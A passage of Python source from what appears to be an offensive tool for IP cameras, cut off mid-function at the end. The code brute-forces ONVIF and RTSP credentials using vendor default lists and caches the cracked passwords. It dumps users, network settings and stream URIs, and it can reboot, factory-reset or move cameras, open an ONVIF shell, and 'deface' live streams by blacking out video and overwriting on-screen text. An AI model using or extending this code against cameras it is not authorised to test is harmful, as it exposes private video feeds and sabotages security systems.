        result = onvif.detect(
            host=args.target,
            ports=ports,
            usernames=usernames,
            passwords=passwords,
            threads=args.threads,
            on_progress=on_progress,
            on_port_check=on_port_check,
            on_port_detected=on_port_detected,
            responsive_ports=responsive_ports,
        )
    finally:
        tui.stop_live()

    if result is not None and result["camera"] is not None:
        tui.success("ONVIF connection established using the following configuration:")
        tui.block({
            "Port": result["port"],
            "ONVIF Username": result["username"],
            "ONVIF Password": result["password"]
        })
        return (
            result["camera"],
            (result["username"], result["password"]),
            result["port"],
            result.get("responsive_ports"),
        )
    
    if result is not None:
        return None, None, None, result.get("responsive_ports")

    return None, None, None, None

def _persist_onvif_cache_entry(
    args: argparse.Namespace,
    port: int | None,
    credentials: tuple[str, str] | None,
    manufacturer: str | None,
    streams: list[str] | None,
    tui: TUI,
    announce: bool = True,
) -> None:
    """
    Save a successful ONVIF authentication to cache.
    """
    if args.no_cache or port is None or credentials is None:
        return

    username, password = credentials
    existing = cachedata.load_target(args.target)
    cached_auth = cachedata.get_cached_onvif_auth(existing)
    if (
        cached_auth is not None
        and cached_auth["port"] == port
        and cached_auth["username"] == username
        and cached_auth["password"] == password
        and cached_auth.get("manufacturer") == manufacturer
        and cached_auth.get("streams", []) == (streams or [])
    ):
        return

    cachedata.upsert_onvif_success(
        args.target,
        port=port,
        username=username,
        password=password,
        manufacturer=manufacturer,
        streams=streams,
    )
    if announce:
        tui.info2("Saved ONVIF credentials to cache")

def _extract_device_info(camera: object, tui: TUI) -> str:
    """
    Extract and display device information.
    Return the manufacturer for a tailored RTSP bruteforce later.
    """
    tui.info("Trying to extract device information...")
    
    cam_info = onvif.get_device_info(camera)
    if cam_info:
        tui.info2("Device Information:")
        tui.block(cam_info)
    else:
        tui.warning("Unable to extract device information")

    if not cam_info:
        return None

    return cam_info.get("Manufacturer") or None

def _extract_onvif_users(camera: object, tui: TUI) -> None:
    """
    Extract and display configured ONVIF users.
    """
    tui.info("Trying to extract configured ONVIF users...")

    users = onvif.get_users(camera)
    if users:
        tui.info2("Configured ONVIF Users:")
        for user in users:
            tui.block(user)
    else:
        tui.warning(
            "Unable to extract ONVIF users. "
            "The camera may restrict access to this operation"
        )

def _reboot_onvif_camera(
    args: argparse.Namespace,
    camera: object,
    tui: TUI,
) -> bool:
    """
    Reboot the camera via ONVIF and perform a simple reachability check.
    """
    tui.warning("Requesting ONVIF system reboot...")

    result = {
        "done": False,
        "ok": False,
    }

    def request_reboot() -> None:
        result["ok"] = onvif.system_reboot(camera)
        result["done"] = True

    worker = threading.Thread(target=request_reboot, daemon=True)
    worker.start()

    # Give the ONVIF request a brief head start. If it fails immediately,
    # surface the error before entering the polling loop.
    worker.join(timeout=1.0)
    if result["done"] and not result["ok"]:
        tui.error("The ONVIF reboot request was rejected or not supported")
        return False

    tui.info2("ONVIF reboot request sent")
    tui.info("Checking if the camera is still reachable...")

    deadline = time.monotonic() + 15
    while time.monotonic() < deadline:
        if not netcomm.is_host_reachable(
            args.target,
            timeout=1.0,
            icmp_attempts=1,
        ):
            tui.success("The device has been rebooted!")
            return True

        time.sleep(2)

    tui.error(
        "The ONVIF reboot request was sent, but the target still appears to be "
        "reachable after 15 seconds."
    )
    return False


def _reset_onvif_camera(
    args: argparse.Namespace,
    camera: object,
    tui: TUI,
) -> bool:
    """
    Factory-reset the camera via ONVIF and perform a simple reachability check.
    """
    if not tui.confirm(
        "Do you really want to factory-reset the camera via ONVIF?",
        default=False,
    ):
        tui.warning("ONVIF factory reset aborted at user request")
        return False

    tui.warning("Requesting ONVIF factory reset...")

    result = {
        "done": False,
        "ok": False,
    }

    def request_reset() -> None:
        result["ok"] = onvif.system_factory_reset(camera, "Hard")
        result["done"] = True

    worker = threading.Thread(target=request_reset, daemon=True)
    worker.start()

    # Give the ONVIF request a brief head start. If it fails immediately,
    # surface the error before entering the polling loop.
    worker.join(timeout=1.0)
    if result["done"] and not result["ok"]:
        tui.error("The ONVIF factory reset request was rejected or not supported")
        return False

    tui.info2("ONVIF factory reset request sent")
    tui.info("Checking if the camera is still reachable...")

    deadline = time.monotonic() + 15
    while time.monotonic() < deadline:
        if not netcomm.is_host_reachable(
            args.target,
            timeout=1.0,
            icmp_attempts=1,
        ):
            tui.success("The device has been reset!")
            return True

        time.sleep(2)

    tui.warning(
        "The ONVIF factory reset request was sent, but the target still appears "
        "to be reachable. Please verify manually that the reset was completed."
    )
    return True


def _extract_network_config(camera: object, tui: TUI) -> None:
    """Extract and display network configuration."""
    tui.info("Trying to extract network configuration...")
    
    interfaces = onvif.get_network_interfaces(camera)
    network_settings = onvif.get_network_settings(camera)

    if interfaces:
        tui.info2("Network Configuration:")
        merged_interfaces = [dict(iface) for iface in interfaces]

        if network_settings:
            merged_interfaces[0].update(network_settings)

        for iface in merged_interfaces:
            tui.block(iface)
    elif network_settings:
        tui.info2("Network Configuration:")
        tui.block(network_settings)
    else:
        tui.warning("Unable to extract network information")

def _extract_media_profiles(camera: object, tui: TUI) -> None:
    """Extract and display ONVIF media profiles."""
    tui.info("Enumerating ONVIF media profiles...")
    
    profiles = onvif.get_profiles(camera)
    if profiles:
        tui.info2("Media Profiles:")
        tui.block([
            f"{p['name'] or p['token']} "
            f"({p['encoding']} {p['resolution']})".strip()
            for p in profiles
        ])
    else:
        tui.warning(
            "No media profiles were returned by the target. "
            "The camera may restrict access to this operation"
        )


def _extract_snapshot_uris(camera: object, tui: TUI) -> None:
    """
    Extract and display ONVIF snapshot URIs when available.
    """
    tui.info("Trying to extract ONVIF snapshot URIs...")

    snapshot_uris = onvif.get_snapshot_uris(camera)
    if snapshot_uris:
        tui.info2("Snapshot URIs:")
        tui.block([
            f"{entry['profile']}: {entry['uri']}"
            for entry in snapshot_uris
        ])
        return

    tui.error("Unable to extract ONVIF snapshot URIs")


def _extract_onvif_capabilities(camera: object, tui: TUI) -> None:
    """
    Extract and display useful post-auth ONVIF capabilities.
    """
    tui.info("Enumerating useful ONVIF capabilities...")

    capabilities = onvif.get_abuse_capabilities(camera)
    if capabilities:
        tui.info2("ONVIF Capabilities:")
        rendered = []
        for key, value in capabilities.items():
            if value == "Yes":
                color = "green"
            elif value == "No":
                color = "red"
            elif value == "Partial":
                color = "yellow"
            else:
                color = "grey70"

            rendered.append(f"[bold]{key}[/]: [{color}]{value}[/]")
        tui.block(rendered)
    else:
        tui.warning("Unable to determine additional ONVIF capabilities")


def _run_onvif_text_deface(
    camera: object,
    message: str,
    tui: TUI,
) -> bool:
    """
    Apply the ONVIF text replacement workflow and verify the result.
    """
    message_label = "an empty string" if message == "" else message
    tui.info(
        "Trying to replace the current on-stream text with {text}",
        text=message_label,
    )
    update_results = onvif.deface_osd_entries(camera, message)
    if not update_results:
        tui.error("No writable on-screen text layer was found")
        return False

    attempted_tokens = [
        entry["token"]
        for entry in update_results
        if entry.get("status") == "updated"
    ]

    rejected_updates = [
        entry for entry in update_results if entry.get("status") != "updated"
    ]

    if not attempted_tokens:
        tui.error("Unable to change the text shown on the stream")
        return False

    if rejected_updates:
        tui.warning(
            "Some text layers could not be updated ({count})",
            count=len(rejected_updates),
        )

    tui.info("Verifying the text update...")

    verification_results = onvif.verify_defaced_osd_entries(
        camera,
        attempted_tokens,
        message,
    )
    verified = [entry for entry in verification_results if entry.get("status") == "verified"]
    truncated = [entry for entry in verification_results if entry.get("status") == "truncated"]
    failed = [entry for entry in verification_results if entry.get("status") == "failed"]
    unconfirmed = [entry for entry in verification_results if entry.get("status") == "unconfirmed"]

    if not verified and not truncated:
        if unconfirmed and not failed:
            tui.warning("The device accepted the update, but ONVIF could not confirm it afterwards")
        else:
            tui.error("Unable to confirm the text update")
        return False

    if truncated:
        for entry in truncated:
            tui.warning(
                "The camera truncated the text. Visible text: [bold]{text}[/bold]",
                text=entry.get("visible_text") or "(empty)",
            )

    if failed:
        tui.warning(
            "Some updated text layers did not keep the requested message ({count})",
            count=len(failed),
        )

    if unconfirmed:
        tui.warning(
            "Some updated text layers could not be confirmed afterwards ({count})",
            count=len(unconfirmed),
        )

    return True


def _save_deface_restore_profile(
    host: str,
    camera: object,
    message: str,
    tui: TUI,
) -> dict | None:
    """
    Capture and persist a restore profile for a future --undeface operation.
    """
    tui.info("A backup profile is being created for future restorations...")
    profile = onvif.build_deface_restore_profile(camera, message)

    has_text_layers = bool(profile.get("text_layers"))
    has_imaging = bool((profile.get("imaging") or {}).get("settings"))
    if not has_text_layers and not has_imaging:
        tui.error("Unable to create a restore profile for this target")
        return None

    path = defacedata.save_restore_profile(host, profile)
    tui.success("Backup profile saved successfully to {path}", path=path)
    return profile


def _deface_onvif(
    host: str,
    camera: object,
    message: str,
    tui: TUI,
) -> bool:
    """
    Darken the stream and overwrite ONVIF OSD text entries when available.
    """
    tui.info("Inspecting ONVIF deface capabilities...")
    deface_support = onvif.get_deface_support(camera)
    supports_darkening = bool(deface_support.get("darkening"))
    supports_text = bool(deface_support.get("text"))

    if not supports_darkening and not supports_text:
        tui.error("The target does not support ONVIF deface")
        if deface_support.get("imaging_traceback"):
            tui.warning("Something went wrong while talking to the target")
        elif deface_support.get("imaging_error"):
            tui.warning("{reason}", reason=deface_support["imaging_error"])
        return False

    if supports_darkening and supports_text:
        tui.info2("The target supports ONVIF deface")
        confirm_message = "Do you want to proceed with the deface attempt?"
    else:
        tui.warning("Only a partial deface is available on this target")
        if not supports_darkening:
            tui.warning("Stream darkening is not available through ONVIF")
        if not supports_text:
            tui.warning("No writable on-stream text layer was found")
        confirm_message = "Do you want to proceed with the partial deface attempt?"

    if not tui.confirm(
        confirm_message,
        default=False,
    ):
        tui.warning("Deface aborted at user request")
        return False

    message_label = "an empty string" if message == "" else message
    tui.warning(
        "Trying to deface the target stream with {text}",
        text=message_label,
    )

    restore_profile = _save_deface_restore_profile(host, camera, message, tui)
    if restore_profile is None:
        return False

    darkening_completed = not supports_darkening
    if supports_darkening:
        tui.info("Trying to darken the stream...")
        imaging_result = onvif.apply_imaging_blackout(camera)
        if not imaging_result.get("ok"):
            tui.error("Unable to darken the stream through ONVIF")
            if imaging_result.get("traceback"):
                tui.warning("Something went wrong while talking to the target")
            elif imaging_result.get("error"):
                tui.warning("{reason}", reason=imaging_result["error"])
            return False

        tui.info("Verifying stream darkening...")
        if not onvif.verify_imaging_blackout(
            camera,
            str(imaging_result.get("token") or ""),
            imaging_result.get("applied_fields") or {},
        ):
            tui.error("Unable to confirm that the stream was darkened")
            return False

        tui.success("The stream was darkened successfully")
        darkening_completed = True

    text_completed = not supports_text
    if supports_text:
        text_completed = _run_onvif_text_deface(
            camera,
            message,
            tui,
        )

    if supports_darkening and supports_text:
        if darkening_completed and text_completed:
            tui.success("The target stream has been defaced!")
            tui.info("To restore the previous configuration, run the tool again with --undeface")
            return True
        return False

    if darkening_completed or text_completed:
        tui.success("The target stream has been (partially) defaced!")
        tui.info("To restore the previous configuration, run the tool again with --undeface")
        return True

    return False


def _undeface_onvif(
    host: str,
    camera: object,
    tui: TUI,
) -> bool:
    """
    Restore the previously saved ONVIF deface profile.
    """
    tui.info("Looking for a saved deface profile for this target...")
    profile = defacedata.load_restore_profile(host)
    if profile is None:
        tui.error("No saved deface profile was found for this target")
        return False

    profile_path = defacedata.get_restore_profile_path(host)
    tui.info2("A saved deface profile was found at {path}", path=profile_path)

    has_text_layers = bool(profile.get("text_layers"))
    imaging_profile = profile.get("imaging") or {}
    has_imaging = bool(imaging_profile.get("settings"))

    if not has_text_layers and not has_imaging:
        tui.error("The saved deface profile does not contain any restorable configuration")
        return False

    if not tui.confirm(
        "Do you want to proceed with the undeface attempt?",
        default=False,
    ):
        tui.warning("Undeface aborted at user request")
        return False

    tui.warning("Trying to restore the target stream...")

    imaging_restored = not has_imaging
    if has_imaging:
        tui.info("Trying to restore the original stream brightness profile...")
        imaging_restored = onvif.restore_imaging_profile(camera, imaging_profile)
        if imaging_restored:
            tui.success("The original stream brightness profile was restored successfully")
        else:
            tui.warning("Unable to restore the original stream brightness profile")

    text_restored = not has_text_layers
    if has_text_layers:
        tui.info("Trying to restore the original on-stream text...")
        text_results = onvif.restore_osd_entries(camera, profile.get("text_layers") or [])
        restored = [entry for entry in text_results if entry.get("status") == "restored"]
        unconfirmed = [entry for entry in text_results if entry.get("status") == "unconfirmed"]
        failed = [entry for entry in text_results if entry.get("status") == "failed"]

        text_restored = bool(restored) and not failed and not unconfirmed
        if text_restored:
            tui.success("The original on-stream text was restored successfully")
        elif restored:
            tui.warning("Some text layers were restored, but others could not be confirmed")
        else:
            tui.warning("Unable to restore the original on-stream text")

    if imaging_restored and text_restored:
        tui.success("The target stream has been restored!")
        return True

    if imaging_restored or text_restored:
        tui.warning("The target stream was only partially restored")
        return True

    tui.error("Unable to restore the target stream")
    return False


def _open_onvif_shell(
    camera: object,
    host: str,
    port: int,
    credentials: tuple[str, str] | dict | None,
    tui: TUI,
) -> bool:
    """
    Launch the interactive onvif-python shell using the current authenticated context.
    """
    if credentials is None:
        tui.error("Unable to open the ONVIF shell without valid credentials")
        return False

    if isinstance(credentials, tuple):
        username = str(credentials[0] or "") if len(credentials) >= 1 else ""
        password = str(credentials[1] or "") if len(credentials) >= 2 else ""
    else:
        username = str(credentials.get("username") or "")
        password = str(credentials.get("password") or "")

    if not username:
        tui.error("Unable to open the ONVIF shell without valid credentials")
        return False

    tui.info("Opening an interactive ONVIF shell...")
    try:
        shell_ok = onvif.open_interactive_shell(
            camera,
            host=host,
            port=port,
            username=username,
            password=password,
        )
    except KeyboardInterrupt:
        raise
    except Exception:
        tui.error("Unable to open the interactive ONVIF shell")
        tui.block(traceback.format_exc().splitlines(), indent=0)
        return False

    if shell_ok:
        tui.info("The interactive ONVIF shell was closed")
        return True

    tui.error("The interactive ONVIF shell exited unexpectedly")
    return False


def _move_onvif_camera(
    camera: object,
    moves: list[tuple[str, float]],
    tui: TUI,
) -> bool:
    """
    Execute one or more ONVIF PTZ movement requests in sequence.
    """
    moved_any = False

    for direction, duration in moves:
        tui.info(
            "Requesting ONVIF PTZ move to {direction} for {duration} second(s)...",
            direction=direction,
            duration=f"{duration:.2f}",
        )

        result = onvif.move_in_direction(
            camera,
            direction=direction,
            duration=duration,
        )

        if not result.get("ok"):
            detail = result.get("detail")
            if detail:
                tui.warning("{detail}", detail=detail)
            else:
                tui.warning("Unable to move the camera via ONVIF")
            continue

        tui.info2("The ONVIF move command was accepted")
        moved_any = True

    if moved_any:
        tui.success("The camera has been moved!")
        return True

    tui.error("No ONVIF PTZ move request was accepted by the target")
    return False

def _extract_rtsp_streams(camera: object, tui: TUI) -> list[str]:
    """
    Extract RTSP streams via ONVIF.
    
    Returns:
        List of RTSP stream URLs, empty list if extraction failed
    """
    tui.info("Attempting to extract RTSP streams via ONVIF...")
    
    streams = onvif.get_rtsp_streams(camera)
    if streams:
        tui.info2("RTSP streams successfully extracted via ONVIF:")
        tui.block(streams)
        return streams
    
    tui.warning(
        "No RTSP streams could be extracted via ONVIF. "
        "The camera may restrict access to this operation"
    )
    return []

def _filter_onvif_rtsp_streams_by_valid_port(
    host: str,
    streams: list[str],
    tui: TUI,
    validated_ports: list[int] | None = None,
    timeout: int = 5,
) -> list[str]:
    """
    Return only RTSP streams whose port is reachable and supports RTSP.
    """
    if validated_ports is not None:
        valid_ports = {
            port for port in validated_ports
            if port in {rtsp.parse_rtsp_url(url)["port"] or 554 for url in streams}
        }
        return [
            url for url in streams
            if (rtsp.parse_rtsp_url(url)["port"] or 554) in valid_ports
        ]

    checked_ports: set[int] = set()
    valid_ports: set[int] = set()

    tui.info("Validating RTSP port(s) extracted via ONVIF...")

    for url in streams:
        port = rtsp.parse_rtsp_url(url)["port"] or 554

        if port in checked_ports:
            continue

        checked_ports.add(port)

        tui.info("Checking if {target}:{port} supports RTSP...", target=host, port=port)

        if rtsp.is_rtsp_port(host, port, timeout=timeout):
            tui.info2("{target} supports RTSP on port {port}!", target=host, port=port)
            valid_ports.add(port)
        else:
            tui.warning("{target} does not support RTSP or port {port} is not reachable", target=host, port=port)

    if not valid_ports:
        tui.error(
            "RTSP ports discovered via ONVIF did not respond to RTSP requests. "
            "Streams may be inaccessible or exposed on a different port."
        )
    else:
        tui.success("At least one RTSP-compatible port was found")

    return [
        url for url in streams
        if (rtsp.parse_rtsp_url(url)["port"] or 554) in valid_ports
    ]

# ----------------------------------------
# RTSP
# ----------------------------------------

def _resolve_rtsp_ports(
    host: str,
    rtsp_kb: dict,
    tui: TUI,
    preferred_port: int | None = None,
    onvif_streams: list[str] | None = None,
    timeout: int = 5,
) -> list[int]:
    """
    Resolve and validate RTSP ports for the target.

    Priority:
    1. User-specified RTSP port
    2. Ports extracted via ONVIF
    3. Common RTSP ports from knowledge base

    Returns:
        List of RTSP ports that responded correctly
    """
    tested_ports: set[int] = set()
    valid_ports: list[int] = []

    kb_ports = _prioritize_rtsp_ports(rtsp_kb.get("ports", []))

    # --- 1. User-specified port ---
    if preferred_port is not None:
        tui.info("Testing user-specified RTSP port {target}:{port}", target=host, port=preferred_port)
        tested_ports.add(preferred_port)

        if rtsp.is_rtsp_port(host, preferred_port, timeout=timeout):
            tui.success("{target} responds to RTSP on port {port}", target=host, port=preferred_port)
            valid_ports.append(preferred_port)
            return valid_ports

        tui.warning("{target}:{port} does not appear to support RTSP", target=host, port=preferred_port)

        if not tui.confirm("Do you want to extend the test to other RTSP ports?", default=True):
            tui.info("RTSP port discovery aborted at user request")
            return []

    # --- 2. Ports extracted via ONVIF ---
    onvif_ports: list[int] = []
    if onvif_streams:
        onvif_ports = sorted(
            {rtsp.parse_rtsp_url(url)["port"] or 554 for url in onvif_streams}
        )

        if onvif_ports:
            tui.info("Testing RTSP port(s) extracted via ONVIF: {ports}", ports=", ".join(str(p) for p in onvif_ports))

        if onvif_ports:
            tui.start_live("Checking RTSP compatibility on ONVIF-derived ports...")

        for port in onvif_ports:
            if port in tested_ports:
                continue

            tested_ports.add(port)
            tui.update_live(
                "Checking if {target}:{port} supports RTSP...".format(
                    target=host,
                    port=port,
                )
            )

            if rtsp.is_rtsp_port(host, port, timeout=timeout):
                tui.success("{target} responds to RTSP on port {port}", target=host, port=port)
                valid_ports.append(port)

        tui.stop_live()

        if valid_ports:
            return valid_ports

    # --- 3. Common RTSP ports ---
    remaining_ports = [p for p in kb_ports if p not in tested_ports]
    ports_before_extended_scan: set[int] | None = None
    stopped_after_first_rtsp_port = False

    tui.info("Testing common RTSP ports from knowledge base")

    try:
        if remaining_ports:
            tui.start_live("Checking common RTSP ports...")

        for idx, port in enumerate(remaining_ports):
            tui.update_live(
                "Checking if {target}:{port} supports RTSP...".format(
                    target=host,
                    port=port,
                )
            )

            if rtsp.is_rtsp_port(host, port, timeout=timeout):
                tui.success("{target} responds to RTSP on port {port}", target=host, port=port)
                valid_ports.append(port)

                is_last = idx == len(remaining_ports) - 1
                if not is_last:
                    tui.stop_live()
                    should_continue = tui.confirm("RTSP service found. Continue scanning remaining ports?", default=False)

                    if not should_continue:
                        tui.info("Stopping RTSP port discovery at user request")
                        stopped_after_first_rtsp_port = True
                        break
                    if ports_before_extended_scan is None:
                        ports_before_extended_scan = set(valid_ports)
                    tui.start_live("Checking common RTSP ports...")
    except PromptInterrupt:
        raise
    except KeyboardInterrupt:
        if valid_ports:
            tui.stop_live()
            tui.info("Stopping RTSP port discovery and continuing with the discovered RTSP port(s)")
            return valid_ports
        raise
    finally:
        tui.stop_live()

    if not valid_ports:
        tui.warning("No RTSP-compatible ports were discovered")
    elif stopped_after_first_rtsp_port:
        pass
    elif ports_before_extended_scan is not None:
        additional_ports = [port for port in valid_ports if port not in ports_before_extended_scan]
        if additional_ports:
            tui.success(
                "Additional RTSP port(s) detected: {ports}",
                ports=", ".join(str(p) for p in additional_ports),
            )
        else:
            tui.info("No additional RTSP ports were discovered")
    else:
        tui.success("RTSP service detected on port(s): {ports}", ports=", ".join(str(p) for p in valid_ports))

    return valid_ports

def _print_rtsp_banner(
    args: argparse.Namespace,
    cache_entry: dict | None,
    rtsp_ports: list[int],
    tui: TUI,
) -> ExitCode:
    """
    Print the RTSP banner for the target and exit.
    """
    cached_banner = cachedata.get_cached_rtsp_banner(cache_entry)
    if cached_banner is not None:
        tui.success(
            "Using previously cached RTSP banner on port {port}: {banner}",
            port=cached_banner["port"],
            banner=cached_banner["value"],
        )
        return ExitCode.SUCCESS

    for port in rtsp_ports:
        banner = rtsp.detect_banner(args.target, port)
        if not banner:
            continue

        if not args.no_cache:
            cachedata.upsert_rtsp_banner(args.target, port=port, banner=banner)
            tui.info2("Saved RTSP banner to cache")

        tui.success(
            "RTSP banner on port {port}: {banner}",
            port=port,
            banner=banner,
        )
        return ExitCode.SUCCESS

    tui.warning("Unable to retrieve an RTSP banner from the discovered RTSP port(s)")
    return ExitCode.FAILURE


def _resolve_rtsp_targets(
    args: argparse.Namespace,
    rtsp_kb: dict,
    ports: list[int],
    manufacturer: str | None = None,
    rtsp_streams: list[str] | None = None,
    onvif_credentials: tuple[str, str] | None = None,
    vendor_override: str | None = None,
    use_exhaustive_paths: bool = False,
):
    """
    Resolve RTSP ports, credentials and paths to test based on context.
    
    Returns:
        (ports, usernames, passwords, paths)
    """

    # --- Vendor ---
    vendor = vendor_override if vendor_override is not None else (args.vendor or manufacturer)

    vendor_entry = rtspdata.find_vendor_entry(vendor, rtsp_kb)

    stream_usernames = []
    stream_passwords = []
    if rtsp_streams:
        for url in rtsp_streams:
            parsed = rtsp.parse_rtsp_url(url)
            if parsed["username"] is not None:
                stream_usernames.append(parsed["username"])
            if parsed["password"] is not None:
                stream_passwords.append(parsed["password"])

    # --- Credentials ---
    usernames = []
    passwords = []

    provided_usernames = _resolve_credential_values(args.username)
    provided_passwords = _resolve_credential_values(args.password)

    fixed_rtsp_credentials = args.username is not None and args.password is not None
    fixed_rtsp_username = args.username is not None and args.password is None
    fixed_rtsp_password = args.password is not None and args.username is None

    if fixed_rtsp_credentials:
        usernames = provided_usernames
        passwords = provided_passwords
    else:
        if fixed_rtsp_username:
            usernames.extend(provided_usernames)
        else:
            if onvif_credentials is not None:
                onvif_username, _ = onvif_credentials
                usernames.append(onvif_username)

            usernames.extend(stream_usernames)
            if vendor_entry:
                usernames.extend(vendor_entry["creds"]["usernames"])
            usernames.extend(rtsp_kb["common_creds"]["usernames"])

        if fixed_rtsp_password:
            passwords.extend(provided_passwords)
        else:
            if onvif_credentials is not None:
                _, onvif_password = onvif_credentials
                passwords.append(onvif_password)

            passwords.extend(stream_passwords)
            if vendor_entry:
                passwords.extend(vendor_entry["creds"]["passwords"])
            passwords.extend(rtsp_kb["common_creds"]["passwords"])

    exhaustive_paths = False

    # --- Paths ---
    paths = []
    provided_connection_strings = _resolve_connection_string_values(args.connection_string)

    if provided_connection_strings:
        paths.extend(provided_connection_strings)
    elif rtsp_streams:
        paths.extend(rtsp.parse_rtsp_url(url)["path"] for url in rtsp_streams)
    if provided_connection_strings:
        pass
    elif vendor_entry:
        paths.extend(vendor_entry.get("paths", {}).get(args.protocol, []))
    elif use_exhaustive_paths:
        exhaustive_paths = True
        paths.extend(rtspdata.get_all_paths(rtsp_kb, args.protocol))
    else:
        paths.extend(rtsp_kb["common_paths"])

    paths = _augment_rtsp_paths_for_multichannel(
        paths,
        rtsp_kb,
        args.protocol,
        prefer_multichannel=args.multi_channel,
    )

    return (
        ports,
        _unique(usernames),
        _unique(passwords),
        paths,
        exhaustive_paths,
    )

def _detect_rtsp_vendor(
    host: str,
    ports: list[int],
    rtsp_kb: dict,
    tui: TUI,
    no_cache: bool = False,
) -> str | None:
    """
    Attempt to identify the RTSP vendor using the Server banner.
    """
    for port in ports:
        banner = rtsp.detect_banner(host, port)
        if not banner:
            continue

        if not no_cache:
            cachedata.upsert_rtsp_banner(host, port=port, banner=banner)
        tui.info("RTSP banner on port {port}: {banner}", port=port, banner=banner)

        vendor = rtspdata.identify_vendor_from_banner(banner, rtsp_kb)
        if vendor:
            tui.success("RTSP vendor identified via banner: {vendor}", vendor=vendor)
            return vendor

    return None

def _expand_rtsp_path(path: str) -> list[str]:
    """
    Expand templated RTSP paths into concrete candidates.
    """
    if "{channel}" not in path:
        return [path]

    channels = [1, 2, 101, 102]
    return [path.format(channel=channel) for channel in channels]

def _is_multichannel_rtsp_path(path: str) -> bool:
    """
    Return True if the RTSP path appears to target a specific channel.
    """
    if "{channel}" in path:
        return True

    lowered = path.lower()
    return any(marker in lowered for marker in (
        "chid=",
        "channel=",
        "cam=",
        "camera=",
        "trackid=",
    ))

def _prioritize_rtsp_paths(
    paths: list[str],
    *,
    prefer_multichannel: bool,
) -> list[str]:
    """
    Reorder RTSP paths, optionally preferring multi-channel candidates first.
    """
    unique_paths = _unique(paths)
    if not prefer_multichannel:
        return unique_paths

    multichannel = [path for path in unique_paths if _is_multichannel_rtsp_path(path)]
    regular = [path for path in unique_paths if not _is_multichannel_rtsp_path(path)]
    return multichannel + regular

def _augment_rtsp_paths_for_multichannel(
    paths: list[str],
    rtsp_kb: dict,
    protocol: str,
    *,
    prefer_multichannel: bool,
) -> list[str]:
    """
    Augment the current path set with KB multi-channel candidates when requested.
    """
    prioritized = _prioritize_rtsp_paths(
        paths,
        prefer_multichannel=prefer_multichannel,
    )
    if not prefer_multichannel:
        return prioritized

    if any(_is_multichannel_rtsp_path(path) for path in prioritized):
        return prioritized

    multichannel_paths = [
        path
        for path in rtspdata.get_all_paths(rtsp_kb, protocol)
        if _is_multichannel_rtsp_path(path)
    ]

    return _unique(multichannel_paths + prioritized)

_CHANNEL_PATTERNS = (
    re.compile(r"(?P<key>chID=)(?P<value>\d+)", re.IGNORECASE),
    re.compile(r"(?P<key>channel=)(?P<value>\d+)", re.IGNORECASE),
    re.compile(r"(?P<key>cam=)(?P<value>\d+)", re.IGNORECASE),
    re.compile(r"(?P<key>camera=)(?P<value>\d+)", re.IGNORECASE),
    re.compile(r"(?P<key>trackID=)(?P<value>\d+)", re.IGNORECASE),
)

def _extract_rtsp_channel_template(path: str) -> tuple[str, int] | None:
    """
    Extract a channel template and the current channel id from a concrete RTSP path.
    """
    for pattern in _CHANNEL_PATTERNS:
        match = pattern.search(path)
        if match is None:
            continue

        channel = int(match.group("value"))
        template = pattern.sub(lambda item: f"{item.group('key')}{{channel}}", path, count=1)
        return template, channel

    return None

def _build_rtsp_channel_attempt(
    base_attempt: RtspAttempt,
    channel_template: str,
    channel: int,
) -> RtspAttempt:
    """
    Build a concrete RTSP attempt for a specific channel id.
    """
    path = channel_template.format(channel=channel)
    url = rtsp.build_rtsp_url(
        host=base_attempt.host,
        port=base_attempt.port,
        path=path,
        username=base_attempt.username,
        password=base_attempt.password,
        use_tcp=base_attempt.protocol == "tcp",
    )
    return RtspAttempt(
        host=base_attempt.host,
        port=base_attempt.port,
        path=path,
        username=base_attempt.username,
        password=base_attempt.password,
        protocol=base_attempt.protocol,
        url=url,
    )

def _probe_rtsp_attempt(
    attempt: RtspAttempt,
    *,
    timeout: int,
) -> RtspProbeResult:
    """
    Probe a single RTSP attempt, falling back to ffprobe when useful.
    """
    result = rtsp.probe_rtsp_url(
        attempt.url,
        timeout=timeout,
    )

    if (
        (attempt.username or attempt.password)
        and not result.stream_available
        and (
            result.status_code == 401
            or result.error is not None
        )
    ):
        result = rtsp.probe_rtsp_url_with_ffprobe(
            attempt.url,
            protocol=attempt.protocol,
            timeout=timeout,
        )

    return result

def _build_rtsp_attempt_from_stream(
    stream_url: str,
    username: str,
    password: str,
    protocol: str,
) -> RtspAttempt:
    """
    Build an RTSP attempt from a concrete stream URL and a credential pair.
    """
    parsed = rtsp.parse_rtsp_url(stream_url)
    url = rtsp.build_rtsp_url(
        host=parsed["host"] or "",
        port=parsed["port"] or 554,
        path=parsed["path"] or "/",
        username=username,
        password=password,
        use_tcp=protocol == "tcp",
    )
    return RtspAttempt(
        host=parsed["host"] or "",
        port=parsed["port"] or 554,
        path=parsed["path"] or "/",
        username=username,
        password=password,
        protocol=protocol,
        url=url,
    )

def _persist_rtsp_channels(
    args: argparse.Namespace,
    channels: list[RtspChannelEntry],
    tui: TUI,
) -> None:
    """
    Save discovered RTSP channels to cache.
    """
    if args.no_cache or not channels:
        return

    serialized = [
        {
            "channel": entry.channel,
            "port": entry.attempt.port,
            "path": entry.attempt.path,
            "protocol": entry.attempt.protocol,
            "url": entry.attempt.url,
        }
        for entry in channels
    ]

    existing = cachedata.get_cached_rtsp_channels(cachedata.load_target(args.target))
    if existing == serialized:
        return

    cachedata.upsert_rtsp_channels(
        args.target,
        channels=serialized,
    )
    tui.info2("Saved RTSP channel enumeration to cache")

def _build_cached_rtsp_channel_entries(
    base_attempt: RtspAttempt,
    cached_channels: list[dict],
) -> list[RtspChannelEntry]:
    """
    Rebuild cached RTSP channel entries using the current credential context.
    """
    entries = []

    for channel in cached_channels:
        channel_id = channel.get("channel")
        path = channel.get("path")
        port = channel.get("port") or base_attempt.port
        protocol = channel.get("protocol") or base_attempt.protocol

        if channel_id is None or not path:
            continue

        url = rtsp.build_rtsp_url(
            host=base_attempt.host,
            port=port,
            path=path,
            username=base_attempt.username,
            password=base_attempt.password,
            use_tcp=protocol == "tcp",
        )

        entries.append(
            RtspChannelEntry(
                channel=int(channel_id),
                attempt=RtspAttempt(
                    host=base_attempt.host,
                    port=port,
                    path=path,
                    username=base_attempt.username,
                    password=base_attempt.password,
                    protocol=protocol,
                    url=url,
                ),
            )
        )

    return entries

def _check_rtsp_channel_enumeration(
    base_attempt: RtspAttempt, template: str, initial_channel: int,
    args: argparse.Namespace, tui: TUI,
) -> bool:
    """Reject likely catch-all paths without advertising the sentinel channel IDs."""
    tui.info("Checking whether the target appears to support RTSP channel enumeration...")
    accepted = 0
    rejected = 0
    for channel in (1337, 31337, 65535):
        if channel == initial_channel:
            continue
